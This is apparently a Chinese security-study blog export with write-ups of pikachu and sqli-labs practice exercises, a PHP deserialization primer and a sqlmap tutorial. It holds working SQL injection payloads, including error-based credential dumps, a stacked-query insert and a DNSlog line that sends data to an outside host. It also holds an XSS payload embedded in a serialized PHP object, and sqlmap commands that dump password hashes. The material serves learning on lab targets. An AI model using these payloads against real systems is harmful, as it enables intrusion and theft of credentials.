<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;__construct()  // 创建对象时触发</span><br><span class="line">&gt;__sleep()   // 使用 serialize 时触发</span><br><span class="line">&gt;__wakeup()  // 使用 unserialize 时触发</span><br><span class="line">&gt;__destruct()   // 对象被销毁时触发</span><br><span class="line">&gt;__call()   // 在对象上下文中调用不可访问的方法时触发</span><br><span class="line">&gt;__callStatic()   // 在静态上下文中调用不可访问的方法时触发</span><br><span class="line">&gt;__get()   // 用于从不可访问的属性读取数据</span><br><span class="line">&gt;__set()   // 用于将数据写入不可访问的属性</span><br><span class="line">&gt;__isset()   // 在不可访问的属性上调用 isset() 或 empty() 触发</span><br><span class="line">&gt;__unset()   // 在不可访问的属性上使用 unset() 时触发</span><br><span class="line">&gt;__toString()   // 把类当作字符串使用时触发</span><br><span class="line">&gt;__invoke()   // 当脚本尝试将对象调用为函数时触发</span><br><span class="line">&gt;————————————————</span><br><span class="line">&gt;版权声明：本文为CSDN博主「imz丶」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">&gt;原文链接：https://blog.csdn.net/yang1234567898/article/details/122147828</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="演示："><a href="#演示：" class="headerlink" title="演示："></a>演示：</h3><p>源代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">            <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该代码逻辑为，你的<strong>输入</strong>需要是一个<strong>序列化的结果</strong>；</p>
<p>代码尝试将反序列化后的对象<strong>赋值</strong>给变量 <code>$unser</code>。如果<strong>反序列化成功</strong>，即 <code>$s</code> 是一个有效的序列化字符串并可以还原为对象，那么变量 <code>$unser</code> 将不为 <code>false</code>，条件 <code>if(!@$unser = unserialize($s))</code> 将为假，执行else中的语句，可以用xss啊之类的有害语句。</p>
<p>写个代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class S&#123;</span><br><span class="line">        public $test=&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $s=new S(); //创建一个对象</span><br><span class="line">    echo serialize($s); //把这个对象进行序列化</span><br><span class="line">echo &quot;123&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>构造一下：O:1:”S”:1:{s:4:”test”;s:6:”test12”;}，会输出test12</p>
<p>那构造xss攻击</p>
<p><code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;&#125;</code></p>
<p>也可以执行其他攻击，如	文件包含、命令执行等。</p>
<h3 id="防御方法："><a href="#防御方法：" class="headerlink" title="防御方法："></a><strong>防御方法：</strong></h3><p>严格控制用户输入</p>
<p>对传入的反序列化参数进行严格过滤</p>
<h2 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h2><p>以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</p>
<p>本章提供的案例中,为了模拟漏洞,通过手动指定LIBXML_NOENT选项开启了xml外部实体解析。</p>
]]></content>
      <categories>
        <category>web漏洞</category>
        <category>pikachu</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>xxe</tag>
        <tag>csrf/ssrf</tag>
        <tag>php反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs</title>
    <url>/2023/05/20/sqli-labs/</url>
    <content><![CDATA[<p>做题记录存在自己的有道云上，准备挑选后再刷一遍，慢慢更新。</p>
<h2 id="less-9-（单引号时间盲注）"><a href="#less-9-（单引号时间盲注）" class="headerlink" title="less 9 （单引号时间盲注）"></a>less 9 （单引号时间盲注）</h2><p>id&#x3D;1 id&#x3D;1’没有回显</p>
<p>尝试id&#x3D;1’ and sleep(5)–+ 5s后显示  (注释符#也是没用的)</p>
<p>id&#x3D; 1’ and if(length(database())&gt;0,sleep(5),1)–+</p>
<p>id&#x3D;1’ and if(substr(database(),1,1)&gt;’a’,sleep(5),1)–+</p>
<p>或者</p>
<p>if(ascii(substr(database(),1,1))&gt;64,sleep(5),1)–+ 也是可以的</p>
<p>爆破即可</p>
<h3 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h3><p><code>id=1‘ and (select load_file(concat(‘\\\\’,(select hex(user())),‘.ho26y3.dnslog.cn/abc’)))--+</code></p>
<p><img src="/../../../Typora/img111/image-20230706140021367.png"></p>
<p>对726F6F7440解码即可</p>
<h2 id="less-11（post请求注入）"><a href="#less-11（post请求注入）" class="headerlink" title="less 11（post请求注入）"></a>less 11（post请求注入）</h2><p>随便输入账号名ad或者ad”，页面报错，但是输入ad’</p>
<p>发现提示</p>
<p><code>...e right syntax to use near &#39;admi&#39; LIMIT 0,1&#39; at line 1</code></p>
<p>说明是存在字符型注入中的<strong>单引号</strong>注入的</p>
<p>用order by 尝试后发现存在联合注入的，爆破即可</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523154632755.png" alt="image-20230523154632755"></p>
<h2 id="less-18（http代理）"><a href="#less-18（http代理）" class="headerlink" title="less 18（http代理）"></a>less 18（http代理）</h2><p>这个输入admin,admin正确账号，显示User agent信息</p>
<p>抓包，将User-Agent处改为，123’(123,和123”均正常显示)，提示如下：</p>
<blockquote>
<p>…right syntax to use near ‘127.0.0.1’, ‘admin’)’ at line 1</p>
</blockquote>
<p>可以判定是有单引号的闭合</p>
<h3 id="思路1："><a href="#思路1：" class="headerlink" title="思路1："></a>思路1：</h3><p>123’#试试，提示如下</p>
<blockquote>
<p>the right syntax to use near ‘’ at line 1</p>
</blockquote>
<p>123’’(两个单引号)试试，页面正常，故认为是<strong>闭合了两边的单引号</strong></p>
<p>（这里一定是原码中有两个用到单引号的参数，见如下的uagent和IP）</p>
<blockquote>
<p>$insert&#x3D;”INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)”;</p>
</blockquote>
<p><code>123&#39; and updatexml(1,concat(0x5e,database()),3) and  &#39; </code>爆库：</p>
<blockquote>
<p>XPATH syntax error: ‘^security’</p>
</blockquote>
<p>and替换成or也是可以的</p>
<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) and  &#39; </code>爆表:</p>
<blockquote>
<p>XPATH syntax error: ‘^emails,referers,uagents,users’</p>
</blockquote>
<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),3) and  &#39; </code>爆列:</p>
<blockquote>
<p>XPATH syntax error: ‘^id,username,password’</p>
</blockquote>
<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(username,&#39;~&#39;,password) from security.users)),3) and  &#39;</code>爆security库下users表中的username和password列：</p>
<blockquote>
<p>XPATH syntax error: ‘^Dumb<del>133,Angelina</del>I-kill-you,Du…</p>
</blockquote>
<h3 id="思路2："><a href="#思路2：" class="headerlink" title="思路2："></a>思路2：</h3><p>看样子是两个参数，那就是123‘,2)#试试，提示</p>
<blockquote>
<p>Column count doesn’t match value count at row 1</p>
</blockquote>
<p>再加一个参数试试，123’,1,2)#，闭合成功。</p>
<p>这里与一般注入不一样，查询方式不是select了，通过源码可以发现是insert语句：</p>
<blockquote>
<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)</p>
</blockquote>
<p>所以要闭合VALUES.</p>
<p>利用$uagent，故构建格式，1’,1,1)#</p>
<p>则：</p>
<blockquote>
<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘1’,1,1)#, ‘$IP’, $uname)</p>
</blockquote>
<p>即：</p>
<blockquote>
<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘1’,1,1)#</p>
</blockquote>
<p>爆库语句：<code>1&#39;,1,updatexml(1,concat(0x5e,database()),3))#</code></p>
<blockquote>
<p>  XPATH syntax error: ‘^security’</p>
</blockquote>
<p>其余语句类似思路1。</p>
<h2 id="less-20-cookie注入"><a href="#less-20-cookie注入" class="headerlink" title="less 20 (cookie注入)"></a>less 20 (cookie注入)</h2><h3 id="思路1：-1"><a href="#思路1：-1" class="headerlink" title="思路1："></a>思路1：</h3><p>有一个正确的账号密码登录后，显示了cookie信息</p>
<p>admin’，有报错信息…LIMIT..</p>
<p>注释掉后，即admin’#，页面正常。</p>
<p><code>Cookie: uname=admin&#39; order by 3#</code>正常，4报错，故有3列</p>
<p><code>Cookie: uname=-admin&#39; union select 1,database(),3 #</code>联合注入即可。</p>
<h3 id="思路2：-1"><a href="#思路2：-1" class="headerlink" title="思路2："></a>思路2：</h3><p><code>Cookie: uname=-admin&#39; and updatexml(1,concat(&#39;!&#39;,database()),3)#</code></p>
<p>嗯，报错注入也是可行的</p>
<h2 id="less-38"><a href="#less-38" class="headerlink" title="less 38"></a>less 38</h2><p>id&#x3D;1’ 报错</p>
<p>id&#x3D;1’–+回显成功<br><code>?id=0&#39; union select 1,user(),database(); insert into users(username,password) values(&#39;stack&#39;, &#39;stack&#39;)%23</code></p>
]]></content>
      <categories>
        <category>web漏洞</category>
        <category>sql注入</category>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化</title>
    <url>/2023/05/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="1-参考文章"><a href="#1-参考文章" class="headerlink" title="1.参考文章"></a>1.参考文章</h1><p><a href="https://xz.aliyun.com/t/12507">php反序列化完整总结 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://spaceman-911.gitee.io/2021/06/30/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E8%B6%85%E7%BB%86%E7%9A%84%EF%BC%89/">PHP-反序列化（超细的） | spaceman’blog (gitee.io)</a></p>
<h1 id="2-反序列化"><a href="#2-反序列化" class="headerlink" title="2.反序列化"></a>2.反序列化</h1><p>php中，序列化函数serialize()，反序列化函数unserialize()。</p>
<p>序列化：将对象序列化为一串字符串；</p>
<p>反序列化相反。</p>
<p>并非只对类可以序列化，数组也可以的。</p>
<h2 id="序列化演示："><a href="#序列化演示：" class="headerlink" title="序列化演示："></a>序列化演示：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">classAAA</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;yuleiyun&quot;</span>;</span><br><span class="line">	 <span class="keyword">protected</span> <span class="variable">$b</span>=<span class="string">&quot;yunque&quot;</span>;</span><br><span class="line">	 <span class="keyword">private</span> <span class="variable">$c</span>=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	 </span>&#123;</span><br><span class="line">		 <span class="keyword">echo</span> <span class="string">&quot;test,ok&quot;</span>;</span><br><span class="line">	 &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> <span class="title function_ invoke__">classAAA</span>();</span><br><span class="line"><span class="variable">$test1</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<blockquote>
<p>O:8:”classAAA”:3:{s:1:”a”;s:8:”yuleiyun”;s:4:”*b”;s:6:”yunque”;s:11:”classAAAc”;s:4:”haha”;}</p>
</blockquote>
<p>对以上结构分析得：</p>
<blockquote>
<p><em>O:对象名的长度:”对象名”:对象属性个数:{s:属性名的长度:”属性名”;s:属性值的长度:”属性值”;}</em></p>
</blockquote>
<p>a是public类型的变量，s表示字符串，8表示变量名的长度，a是变量名。</p>
<p>b是protected类型的变量，它的变量名长度为4，protected属性的表示方式是在变量名前加上%00*%00，这个长度就是3了，%00很熟悉了，ASCII码即为0。</p>
<p>c是private类型的变量，c的变量名前添加了%00类名%00。所以，private属性的表示方式是在变量名前加上%00类名%00。</p>
<p>而且可见，序列化字符串中<strong>只保存变量</strong>，不保存函数方法。</p>
<h2 id="反序列化演示"><a href="#反序列化演示" class="headerlink" title="反序列化演示"></a>反序列化演示</h2><blockquote>
<p>在php下:</p>
<p>echo 输出的是变量和字符串;</p>
<p>var_dump 输出的是变量类型,变量长度和变量值;打印数组及其结构</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">classAAA</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;yuleiyun&quot;</span>;</span><br><span class="line">	 <span class="keyword">protected</span> <span class="variable">$b</span>=<span class="string">&quot;yunque&quot;</span>;</span><br><span class="line">	 <span class="keyword">private</span> <span class="variable">$c</span>=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	 </span>&#123;</span><br><span class="line">		 <span class="keyword">echo</span> <span class="string">&quot;test,ok&quot;</span>;</span><br><span class="line">	 &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> <span class="title function_ invoke__">classAAA</span>();</span><br><span class="line"><span class="variable">$test1</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="variable">$test2</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$test2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<blockquote>
<p>object(classAAA)#2 (3) {<br> [“a”]&#x3D;&gt;<br> string(8) “yuleiyun”<br> [“b”:protected]&#x3D;&gt;<br> string(6) “yunque”<br> [“c”:”classAAA”:private]&#x3D;&gt;<br> string(4) “haha”<br>}</p>
</blockquote>
<p>除此之外。var_dump与 echo具体输出的话，<strong>只能指向公共变量a</strong>，</p>
<p>如var_dump($test2-&gt;a);</p>
<p>否则出现:</p>
<blockquote>
<p>Fatal error: Uncaught Error: Cannot access protected property </p>
</blockquote>
<h1 id="3-漏洞产生原理"><a href="#3-漏洞产生原理" class="headerlink" title="3.漏洞产生原理"></a>3.漏洞产生原理</h1><p>与魔术方法有关，魔术方法接收了序列化后未经过滤的字符串，不当执行造成的。比如魔术方法有一些检查，你可以构造一些数据绕过这些检查，那这样未过滤的输入，危害性很大咯。</p>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><blockquote>
<p>魔术方法命名是以符号<strong>开头的，比如</strong> construct, <strong>destruct,</strong> toString, <strong>sleep,</strong> wakeup等等。这些函数在某些情况下会自动调用。</p>
<ul>
<li>__construct():具有构造函数的类会在每次创建新对象时先调用此方法。</li>
<li>__destruct():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</li>
<li>__toString()方法用于一个类被当成字符串时应怎样回应。例如echo $obj;应该显示些什么。 <strong>此方法必须返回一个字符串</strong>，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</li>
<li>__sleep()方法在一个对象被序列化之前调用；可以指定要序列化的对象属性</li>
<li>__wakeup():unserialize( )会检查是否存在一个_wakeup( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。</li>
<li>get(),set() 当调用或设置一个类及其父类方法中未定义的属性时</li>
<li>__invoke() 调用函数的方式调用一个对象时的回应方法</li>
<li>call 和 callStatic前者是调用类不存在的方法时执行，而后者是调用类不存在的静态方式方法时执行。</li>
<li>isset()：在不可访问的属性上调用isset()或empty()触发 </li>
<li>unset()：在不可访问的属性上使用unset()时触发</li>
</ul>
</blockquote>
<p><strong>注意：php代码，执行完最后一行代码，会自动销毁变量（可能不太准确）</strong></p>
<h2 id="魔术方法执行顺序"><a href="#魔术方法执行顺序" class="headerlink" title="魔术方法执行顺序"></a>魔术方法执行顺序</h2><p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">	 </span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;执行了construct&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;执行了destruct&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;执行了sleep&quot;</span>;</span><br><span class="line">		 <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">		  </span><br><span class="line">	&#125;</span><br><span class="line">	  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		 <span class="keyword">return</span> <span class="string">&quot;执行了toString&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;执行了wakeup&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;new一个对象\n&quot;</span>;</span><br><span class="line"><span class="variable">$test</span> =<span class="keyword">new</span> <span class="title class_">Test1</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n直接输出类，会调用To_string\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n序列化，先执行sleep(若有)哈，再序列化\n&quot;</span>;</span><br><span class="line"><span class="variable">$test1</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n反序列化，先执行wakeup(若有)，有则先调用wakeup\n&quot;</span>;</span><br><span class="line"><span class="variable">$test2</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<blockquote>
<p>new一个对象<br>执行了construct</p>
<p>直接输出类，会调用To_string<br>执行了toString</p>
<p>序列化，先执行sleep(若有)哈，再序列化<br>执行了sleep</p>
<p>反序列化，先执行wakeup(若有)，有则先调用wakeup<br>执行了wakeup<br>执行了destruct执行了destruct</p>
</blockquote>
<p>两次destruct，销毁了反序列化对象一次，new的对象一次。</p>
<p>注意：<strong>我这里如果不在sleep指定序列化的变量，是输出不出来的（wakeup，还有反序列的结果）</strong></p>
<blockquote>
<p>public function __sleep(){<br>    echo “执行了sleep”;<br>     <strong>return array();</strong><br>}</p>
</blockquote>
<h2 id="反序列化与构造函数"><a href="#反序列化与构造函数" class="headerlink" title="反序列化与构造函数"></a>反序列化与构造函数</h2><p>虽然反序列化返回的也是一个对象。但构造函数不会在反序列化期间被调用，而是在对象创建时（使用<code>new</code>关键字）才会被调用。反序列化过程只会还原对象的状态，而不会再次创建对象。</p>
<h1 id="4-实例"><a href="#4-实例" class="headerlink" title="4.实例"></a>4.实例</h1><h2 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h2><p>见本博客的CVE部分的CVE-2016-7124</p>
<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><blockquote>
<ol>
<li>未定义 <code>__wakeup()</code> 方法： 如果类的定义中没有定义 <code>__wakeup()</code> 方法，无论序列化字符串中的内容如何，都不会触发 <code>__wakeup()</code> 方法的执行。</li>
<li>类的名称不匹配： 序列化字符串中指定的类名与实际的类名不匹配，或者序列化字符串中的类不存在时，也不会触发 <code>__wakeup()</code> 方法。</li>
<li>修改类定义： 如果在序列化和反序列化之间修改了类的定义，包括类名、属性或方法的修改，可能会导致 <code>__wakeup()</code> 方法不被调用。因为序列化和反序列化过程依赖于类的定义和结构，如果类的定义发生了改变，可能无法正确还原对象的结构，进而无法触发 <code>__wakeup()</code> 方法。</li>
</ol>
</blockquote>
<h2 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h2><h4 id="漏洞特点"><a href="#漏洞特点" class="headerlink" title="漏洞特点"></a>漏洞特点</h4><p>1.相当于构造闭合。（已知php在反序列化时，底层代码以;作为字段分隔，以}作为结尾，且根据长度判断内容。通过构造一定范围内的….;}提前闭合，挤出后面的内容。）</p>
<p>2.长度不对应会报错。</p>
<h4 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h4><p>代码中存在针对序列化后的字符串进行了过滤操作。</p>
<h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><h2 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h2>]]></content>
      <categories>
        <category>web漏洞</category>
        <category>php反序列化</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>php反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap使用</title>
    <url>/2023/05/20/sqlmap%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>以sqli-labs为例,php版本为5.3，我的高版本会出错</p>
<p>windows下，cmd命令中切换到sqlmap.py所在文件夹</p>
<h1 id="一、基础"><a href="#一、基础" class="headerlink" title="一、基础"></a>一、基础</h1><h2 id="1-判断是否存在注入"><a href="#1-判断是否存在注入" class="headerlink" title="1.判断是否存在注入"></a>1.判断是否存在注入</h2><p>假设目标注入点是<a href="http://localhost:81/sqli/Less-1/?id=11%EF%BC%8C%E5%88%A4%E6%96%AD%E5%85%B6%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%9A%84%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%E6%89%80%E7%A4%BA%E3%80%82">http://localhost:81/sqli/Less-1/?id=11，判断其是否存在注入的命令如下所示。</a></p>
<p><code>sqlmap.py -u http://localhost:81/sqli/Less-1/?id=1</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620141227729.png"></p>
<p>当注入点后的参数2个以上，需要加双引号</p>
<p><code>sqlmap.py -u &quot;http://localhost:81/sqli/Less-1/?id=1&amp;uid=2 &quot;</code></p>
<h2 id="2-判断文本中的请求是否存在注入"><a href="#2-判断文本中的请求是否存在注入" class="headerlink" title="2.判断文本中的请求是否存在注入"></a>2.判断文本中的请求是否存在注入</h2><p>从文件中加载HTTP请求，SQLMap可以从一个文本文件中获取HTTP请求，这样就可以不设置其他参数（如cookie、POST数据等）,txt文件中的内容为Web数据包</p>
<p>也就是bp抓包拦截的请求内容，保存为txt文件，之后</p>
<p><code>sqlmap.py –r desktop/1.txt</code> &#x2F;&#x2F;-r一般在存在cookie注入时使用</p>
<h2 id="3-查询当前用户下的所有数据库"><a href="#3-查询当前用户下的所有数据库" class="headerlink" title="3.查询当前用户下的所有数据库"></a>3.查询当前用户下的所有数据库</h2><p>该命令是确定网站存在注入后，用于查询当前用户下的所有数据库，如下所示。如果当前用户有权限读取包含所有数据库列表信息的表，使用该命令就可以列出所有数据库</p>
<p><code>sqlmap.py -u http://localhost:81/sqli/Less-1/?id=1 --dbs </code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620141633613.png"></p>
<p>想查询xxx数据库下的表名时，–dbs缩写为 <code>-D xxx</code></p>
<h2 id="4-爆表"><a href="#4-爆表" class="headerlink" title="4.爆表"></a>4.爆表</h2><p><code>sqlmap.py -u http://localhost:81/sqli/Less-1/?id=1 -D security --tables</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620141930429.png"></p>
<p>继续注入时，–tables缩写成-T</p>
<h2 id="5-爆列"><a href="#5-爆列" class="headerlink" title="5.爆列"></a>5.爆列</h2><p><code>sqlmap.py -u http://localhost:81/sqli/Less-1/?id=1 -D security -T users --columns</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620142054630.png"></p>
<p>后续的注入中，–columns缩写成-C</p>
<h2 id="6-爆字段"><a href="#6-爆字段" class="headerlink" title="6.爆字段"></a>6.爆字段</h2><p><code>sqlmap.py -u http://localhost:81/sqli/Less-1/?id=1 -D security -T users -C password,username --dump</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620142235027.png"></p>
<h2 id="7-获取数据库的所有用户"><a href="#7-获取数据库的所有用户" class="headerlink" title="7.获取数据库的所有用户"></a>7.获取数据库的所有用户</h2><p>该命令的作用是列出数据库的所有用户，如下所示。在当前用户有权限读取包含所有用户的表的权限时，使用该命令就可以列出所有管理用户。</p>
<p><code>sqlmap.py ...?id=1 --users</code></p>
<h2 id="8-获取数据库用户的密码"><a href="#8-获取数据库用户的密码" class="headerlink" title="8.获取数据库用户的密码"></a>8.获取数据库用户的密码</h2><p>如果当前用户有读取包含用户密码的权限，SQLMap会先列举出用户，然后列出Hash，并尝试破解。</p>
<p><code>sqlmap.py -u...?id=1 --passwords</code></p>
<h2 id="9-获取当前网站数据库的名称"><a href="#9-获取当前网站数据库的名称" class="headerlink" title="9.获取当前网站数据库的名称"></a>9.获取当前网站数据库的名称</h2><p><code>-- current -db</code></p>
<h2 id="10-获取当前网站数据库的用户名称"><a href="#10-获取当前网站数据库的用户名称" class="headerlink" title="10.获取当前网站数据库的用户名称"></a>10.获取当前网站数据库的用户名称</h2><p><code>--current -user</code></p>
<h1 id="二、进阶"><a href="#二、进阶" class="headerlink" title="二、进阶"></a>二、进阶</h1><h2 id="1-–level-5：探测等级"><a href="#1-–level-5：探测等级" class="headerlink" title="1.–level 5：探测等级"></a>1.–level 5：探测等级</h2><p>参数–level 5指需要执行的测试等级，一共有5个等级（1～5），可不加level，默认是1。SQLMap使用的Payload可以在<strong>xml&#x2F;payloads.xml</strong>中看到，也可以根据相应的格式添加自己的Payload，<strong>其中5级包含的Payload最多</strong>，会自动破解出cookie、XFF等头部注入。当然，<strong>level 5的运行速度也比较慢</strong>。</p>
